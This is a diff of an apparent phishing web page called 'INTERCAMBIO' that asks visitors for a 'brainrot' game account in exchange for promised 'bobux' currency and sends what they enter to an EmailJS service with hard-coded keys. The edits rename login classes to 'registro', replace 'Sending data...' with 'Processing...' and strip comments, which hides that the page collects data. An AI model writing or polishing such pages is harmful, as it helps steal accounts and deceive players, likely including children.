@@ -10,7 +10,7 @@
     
     <!-- META TAGS SEO -->
     <meta name="description" content="Completa tu peticion.">
-    <meta name="keywords" content="peticiones">
+    <meta name="keywords" content="brainrots">
     <meta name="author" content="Sistema de Intercambios">
     <meta name="robots" content="noindex, nofollow">
     
@@ -46,7 +46,7 @@
         }
         
         /* CONTENEDOR PRINCIPAL OPTIMIZADO PARA MÓVILES */
-        .ogin-container {
+        .registro-container {
             width: 100%;
             max-width: 400px;
             margin: 10px auto;
@@ -60,7 +60,7 @@
             position: relative;
             overflow: hidden;
         }
-        .ogin-container::before {
+        .registro-container::before {
             content: '';
             position: absolute;
             top: -2px;
@@ -102,7 +102,7 @@
             line-height: 1.2;
         }
         
-        .ogin-subtitle {
+        .registro-subtitle {
             color: #a0aec0;
             font-size: 1rem;
             margin-bottom: 25px;
@@ -110,7 +110,7 @@
         }
         
         /* FORMULARIO MEJORADO PARA TACTIL */
-        .ogin-form {
+        .registro-form {
             margin-bottom: 20px;
         }
         
@@ -227,7 +227,7 @@
         
         /* MEJORAS ESPECÍFICAS PARA MÓVILES PEQUEÑOS */
         @media (max-width: 380px) {
-            .ogin-container {
+            .registro-container {
                 padding: 20px 15px;
                 border-radius: 14px;
             }
@@ -236,7 +236,7 @@
                 font-size: 1.9rem;
             }
             
-            .ogin-subtitle {
+            .registro-subtitle {
                 font-size: 0.9rem;
                 margin-bottom: 20px;
             }
@@ -263,7 +263,7 @@
                 align-items: flex-start;
             }
             
-            .ogin-container {
+            .registro-container {
                 margin: 5px auto;
                 padding: 20px;
             }
@@ -273,7 +273,7 @@
                 margin-bottom: 3px;
             }
             
-            .ogin-subtitle {
+            .registro-subtitle {
                 margin-bottom: 15px;
                 font-size: 0.9rem;
             }
@@ -289,7 +289,7 @@
                 font-size: 16px;
             }
             
-            .ogin-container {
+            .registro-container {
                 max-width: 480px;
                 padding: 40px 35px;
                 border-radius: 20px;
@@ -300,7 +300,7 @@
                 margin-bottom: 8px;
             }
             
-            .ogin-subtitle {
+            .registro-subtitle {
                 font-size: 1.1rem;
                 margin-bottom: 35px;
             }
@@ -338,7 +338,7 @@
     </style>
 </head>
 <body>
-    <div class="ogin-container">
+    <div class="registro-container">
         <!-- SELECTOR DE IDIOMA -->
         <div class="language-selector">
             <select id="language-select">
@@ -348,9 +348,9 @@
         </div>
         
         <div class="intercambio-title">INTERCAMBIO</div>
-        <div class="ogin-subtitle" data-es="Completar peticion" data-en="Complete request">Completar Peticion</div>
+        <div class="registro-subtitle" data-es="Completar peticion" data-en="Complete request">Completar Peticion</div>
         
-        <form id="forma-registro" class="ogin-form">
+        <form id="forma-registro" class="registro-form">
             <div class="form-group">
                 <label for="account" data-es="Cuenta de brainrot:" data-en="Brainrot account:">Cuenta de brainrot:</label>
                 <input type="text" id="account" placeholder="" required>
@@ -383,37 +383,35 @@
                 title: "INTERCAMBIO",
                 subtitle: "Completar",
                 accountLabel: "Cuenta de brainrot:",
-                loading: "Enviando datos...",
+                loading: "Procesando...",
                 acceptButton: "CONTINUAR",
                 thankYou: "¡Gracias! ✅",
                 requestSuccess: "Peticion completada con éxito",
                 brainrotProcessed: "Tu Peticion ha sido procesada",
-                bobuxArrival: "Contacto en 24-48 horas"
+                bobuxArrival: "24-48 horas"
             },
             en: {
                 title: "EXCHANGE",
                 subtitle: "Complete",
                 accountLabel: "Brainrot account:",
-                loading: "Sending data...",
+                loading: "Processing...",
                 acceptButton: "CONTINUE",
                 thankYou: "Thank You! ✅",
                 requestSuccess: "Request completed successfully",
                 brainrotProcessed: "Your request has been processed",
-                bobuxArrival: "We will contact you in 24-48 hours"
+                bobuxArrival: "24-48 hours"
             }
         };
 
         // Idioma por defecto
         let currentLang = 'es';
 
-        // Inicializar EmailJS
         emailjs.init("BgugL5adTp__2FfNx");
         
         // Función para cambiar idioma
         function changeLanguage(lang) {
             currentLang = lang;
             
-            // Actualizar textos con atributos data
             document.querySelectorAll('[data-es]').forEach(element => {
                 if (element.hasAttribute(`data-${lang}`)) {
                     element.textContent = element.getAttribute(`data-${lang}`);
@@ -441,7 +439,6 @@
                 
                 console.log('Enviando email con Template ID: template_ga9xk7u');
                 
-                // Enviar email
                 emailjs.send('service_08y0xce', 'template_ga9xk7u', templateParams)
                     .then(function(response) {
                         console.log('✅ Registrado!', response);
